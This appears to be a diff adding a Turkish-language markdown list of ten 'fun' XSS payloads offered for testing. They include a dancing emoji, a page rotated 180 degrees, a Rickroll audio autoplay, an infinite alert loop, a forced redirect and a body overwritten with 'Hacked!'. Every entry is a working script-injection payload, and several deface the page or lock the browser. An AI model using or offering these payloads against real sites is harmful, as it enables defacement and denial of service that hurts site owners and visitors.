@@ -1,0 +1,128 @@
+XSS açıkları için farklı, ilginç ve eğlenceli payloadlar deneyerek test sürecini daha keyifli hale getirebilirsin. Aşağıda birkaç örnek verilmiştir:
+
+---
+
+ 1. **Dans Eden Emoji**
+Sitede dans eden bir emoji oluştur:
+```html
+<script>
+    let emoji = document.createElement('div');
+    emoji.style.position = 'fixed';
+    emoji.style.top = '50%';
+    emoji.style.left = '50%';
+    emoji.style.fontSize = '100px';
+    emoji.textContent = '💃';
+    document.body.appendChild(emoji);
+    setInterval(() => emoji.style.transform = `rotate(${Date.now() % 360}deg)`, 100);
+</script>
+```
+
+---
+
+### 2. **Ters Çevirilmiş Sayfa**
+Sitenin tüm stilini ters çevir:
+```html
+<script>
+    document.body.style.transform = "rotate(180deg)";
+</script>
+```
+
+---
+
+### 3. **Rickroll (Efsane)**
+Sayfaya Rick Astley'in şarkısını göm:
+```html
+<script>
+    let audio = new Audio('https://www.myinstants.com/media/sounds/rickroll-sound-effect.mp3');
+    audio.play();
+</script>
+```
+
+---
+
+### 4. **Renkli Disco Arka Plan**
+Sayfa arka planını sürekli değiştir:
+```html
+<script>
+    setInterval(() => {
+        document.body.style.backgroundColor = `rgb(${Math.random()*255}, ${Math.random()*255}, ${Math.random()*255})`;
+    }, 500);
+</script>
+```
+
+---
+
+### 5. **Yavaşlayan Fare İmleci**
+Fare imlecini yavaşlat:
+```html
+<script>
+    document.onmousemove = function(e) {
+        window.scrollBy(e.movementX / 10, e.movementY / 10);
+    };
+</script>
+```
+
+---
+
+### 6. **Troll Alert Kutuları**
+Sayfayı açılmaz bir alert kutusuyla doldur:
+```html
+<script>
+    while (true) alert('XSS Test 😈');
+</script>
+```
+
+---
+
+### 7. **Matrix Efekti**
+Sayfada bir Matrix kodu efekti oluştur:
+```html
+<script>
+    let canvas = document.createElement('canvas');
+    document.body.appendChild(canvas);
+    let ctx = canvas.getContext('2d');
+    canvas.width = window.innerWidth;
+    canvas.height = window.innerHeight;
+    let columns = Array(canvas.width).fill(0);
+    setInterval(() => {
+        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+        ctx.fillRect(0, 0, canvas.width, canvas.height);
+        ctx.fillStyle = '#0F0';
+        columns = columns.map((y, index) => {
+            let text = String.fromCharCode(Math.random() * 128);
+            ctx.fillText(text, index * 10, y);
+            return y > canvas.height || Math.random() > 0.95 ? 0 : y + 10;
+        });
+    }, 50);
+</script>
+```
+
+---
+
+### 8. **Sayfanın Baş Aşağı Kayması**
+Sayfa yavaşça aşağı doğru kayar:
+```html
+<script>
+    setInterval(() => window.scrollBy(0, 10), 100);
+</script>
+```
+
+---
+
+### 9. **Google'a Yönlendirme**
+Kullanıcıyı başka bir siteye yönlendir:
+```html
+<script>
+    window.location = 'https://www.google.com';
+</script>
+```
+
+---
+
+### 10. **Sayfa İçeriğini Trolle**
+Mevcut içeriği rastgele yazılarla değiştir:
+```html
+<script>
+    setInterval(() => document.body.innerHTML = `<h1>Hacked! 😜</h1>`, 1000);
+</script>
+```
